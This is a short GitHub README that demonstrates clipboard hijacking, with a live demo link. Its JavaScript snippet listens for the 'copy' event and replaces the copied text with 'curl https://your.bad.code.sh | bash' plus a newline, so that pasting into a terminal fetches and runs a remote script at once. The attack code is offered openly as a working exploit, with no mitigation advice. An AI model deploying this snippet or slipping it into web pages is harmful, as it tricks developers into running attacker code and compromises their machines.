# copy-paste-hack-js
During their job, developers often copy and paste code from the Internet from sources like Stackowerflow and other websites.  
I have found an **exploit**, with just some lines of JavaScript code, that can alter the copy-paste feature of any browser and make you paste (and execute) a different kind of code.

A running **demo** based on the content of this repository can be found here:  
[**TRY IT NOW**](https://marco97pa.github.io/copy-paste-hack-js/)

## How it works behind the scenes
Using plain JavaScript we detect every time there is a "copy" event on the text the user needs to copy.
When it happens, we set the clipboard content of the user with a different code, as we wish.
We also add a "/n" to simulate the Enter key and execute the code right away.

```javascript
document.getElementById('copyme').addEventListener(
    'copy', function(e){
        e.clipboardData.setData('text/plain',
        'curl https://your.bad.code.sh | bash\n');
        e.preventDefault();
    }
)
```
